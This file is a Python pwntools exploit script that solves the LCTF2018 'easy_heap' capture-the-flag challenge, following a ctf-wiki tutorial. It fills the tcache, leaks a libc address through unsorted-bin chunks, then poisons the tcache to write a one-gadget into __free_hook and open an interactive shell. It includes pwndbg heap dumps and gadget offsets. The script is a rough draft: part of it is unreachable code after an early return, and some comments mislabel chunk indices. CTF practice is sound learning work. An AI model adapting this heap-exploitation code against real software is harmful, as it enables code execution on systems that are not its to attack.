#!/usr/bin/python
# Learned from https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/#challenge-1-lctf2018-pwn-easy_heap
from pwn import *

EOL = 'command?\n> ' 
def malloc(size, content=None):
    info('malloc ' + content)
    r.sendlineafter(EOL, '1')
    r.sendlineafter('size \n> ', str(size))
    r.sendlineafter('content \n> ', content or 'AAAA')

def free(index):
    r.sendlineafter(EOL, '2')
    r.sendlineafter('index \n> ', str(index))

def put(index):
    r.sendlineafter(EOL, '3')
    r.sendlineafter('index \n>', str(index))
    string = r.recvline()[:-1]
    return string

def libc_leak():
    for i in xrange(10):
        malloc(0x10, str(i) * 5)
    
    for i in xrange(6):
        free(i)
    free(9) # now the tcache bins are filled up

    free(6) # now 6 is in unsorted bin and has valid fd and bk
    free(7) # now 7 is in unsorted bin and has valid fd and bk
    free(8) # now 8 is in unsorted bin and has valid fd and bk

    # Now all chunks are freed
    # 2. put 6, 7, 8 back to malloced so that it can be freed again
    # To malloc 6, 7, 8 we have to consume the tcache first. The overwrite operation needs to happen in the end, otherwise mallocing operation will override the overwrite operation.
    for i in xrange(7):
        malloc(0xf8, str(i) * 0x20)
    malloc(0x50, '7' * 0x40)
    malloc(0x20, '8')

    string = put(8)
    info(string)
    
    for i in xrange(9):
        free(i)


    return u64(string.strip().ljust(8, '\x00'))



    # malloc(0x20, '9' * 0x20)

    # Now all chunks are malloced
    # 3. re-fill tcache bins
    for i in xrange(1, 7):
        free(i) # 1-6 are freed
    free(8)

    # 4. get valid fd and bk 
    free(7)

    malloc(0x50, '1' * 0x40)
    free(1)
    # freed indices: 1-6, 7, 8
   
    pause()
    # 5. re-malloc 1 to overwrite the pre_use in 9
    pause()
    malloc(0xf8, '1'*0xf0) # The index is 1
    pause()
    # TODO: check unsorted bin free checking
    # free 0 to fill in tcache 
    free(0)
    free(9)

    # 6. emptify tcache bins by malloc
    for i in xrange(7):
        malloc(0x10, str(i)) # index: 0-6

    # 7. use unsorted bin
    malloc(0x10, str(7)) # index: 7
    string = put(1)

    info(string)
    return u64(string.strip().ljust(8, '\x00'))


def writeto(where, gadgets):
    info('writing to 0x%x with [%s]' % (where, ",".join(map(hex, gadgets))))

    # 1. fill up tcache, and make sure it is a -> a+0x100 -> a+0x200

    for i in xrange(3):
        # 2. allocate the first tcache chunk with overriding size
        malloc(0xf8, 'A' * 0xf8 + p8(0xa1))

        # 3. allocate the second chunk
        malloc(0xf8)

        # 4. free the second chunk, which index is 1
        free(1+i)


    # now we should have 0, 1, 2

    """
    pwndbg> bins
    tcachebins
    0x100 [  1]: 0x5598b2195d50 <- 0x0
    0x1f0 [  3]: 0x5598b2195950 -> 0x5598b2195750 -> 0x5598b2195550 -> 0x0
    unsortedbin
    all: 0x5598b2195a40 -> 0x7f95e3c87ca0 (main_arena+96) <- 0x5598b2195c40
    top_chunk: 0x5598b2195e40
    """

    malloc(0x40, '3' * 0x20)   # 3, tcache, 0x5598b2195d50
    malloc(0x40, '4' * 0x20)   # 4, unsorted bin, 0x5598b2195a50
    malloc(0x40, '5' * 0x20)   # 4, unsorted bin, 0x5598b2195b50
    malloc(0x40, '6' * 0x20)   # 4, unsorted bin, 0x5598b2195c50
    free(3)
    free(6) # 0x5598b2195c50 -> 0x5598b2195d50
    malloc(0xf8, '3' * 0xf8 + p8(0xa1))
    malloc(0x40, '6' * 0x20)
    free(6)

    # now we should have 0, 1, 2, 3
    free(5)
    free(4) # 0x5598b2195a50 -> 0x5598b2195b50
    malloc(0xf8, '4' * 0xf8 + p8(0xa1))
    malloc(0x40, '5' * 0x20)
    free(5)


    # now we should have 0, 1, 2, 3, 4, and everything is clean but 0x1f0 in tcachebins
   
    for i in [5, 6]:
        malloc(0x40, str(i) * 0x20) # i
        malloc(0x40) # i+1

        free(i+1)
        free(i) # i -> i+1
        malloc(0xf8, str(i) * 0xf8 + p8(0xa1))
        malloc(0x40)
        free(i+1)
        
    # now we should have 0, 1, 2, 3, ... 6 and filled up 0x1f0 tcache bins

    # now we need one more time, and it should be put in unsorted bin
    i = 7
    malloc(0x40, str(i) * 0x20) # i
    malloc(0x40) # i+1

    free(i+1)
    free(i) # i -> i+1
    malloc(0xf8, str(i) * 0xf8 + p8(0xa1)) # 7
    malloc(0x40) # 8, 0x5623d3ec4350
    malloc(0xf8, str(9) * 0x98 + p8(0x61)) # 9, 0x5623d3ec4450
    free(8)

    """
    unsortedbin
    all: 0x5623d3ec4340 -> 0x7efd7d0bbca0 (main_arena+96) <- 0x5623d3ec4340
    pwndbg> x/2gx 0x5623d3ec4340
    0x5623d3ec4340:	0x3737373737373737	0x0000000000000191
    """
    # now we have 0-7, 9
    # free(9)
    # malloc(0x150, str(8) * 0x100 + p64(where))
    malloc(0x100, '8' * 0x40)
    free(0) # we emptify 0 for later use
    free(9)

    # now 0, 9 is free
    free(8)
    malloc(0x150, str(8) * 0x100 + p64(where))
    malloc(0x40, '0' * 0x20)
    what = ''.join(map(p64, gadgets))
    info(what)

    malloc(0x40, what)

    put(1)

    pause()
    free(7)
    r.interactive()


def exploit():
    leaked_address = libc_leak()
    info(hex(leaked_address))
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.29.so')
    libc.address = leaked_address - 0x1bfc38 - 0x25000
    info('libc address: %s' % hex(libc.address))

    # writeto(libc.symbols['__free_hook'], libc.address+0x4f322)
    writeto(libc.symbols['__free_hook'], [libc.address+0x106ef8]) 
    # writeto(libc.symbols['__free_hook'], [libc.address+0xe237f]) 
    # writeto(libc.symbols['__malloc_hook'], [libc.address+0x0010b31e, libc.address+0x0010b31e, libc.address+0xe237f])  # pop rcx
    # writeto(libc.symbols['__free_hook'], libc.address+0x106ef8)
    r.interactive()


def init(v):
    # r = process(['libc2.%d/ld-2.%d.so' % (v, v), './easy_heap'], env={'LD_PRELOAD': os.path.join(os.getcwd(), 'libc2.%d/libc-2.%d.so' % (v, v))})
    r = process(['easy_heap'])
    return r

if __name__ == "__main__":
    r = init(29) 
    print util.proc.pidof(r)
    exploit()
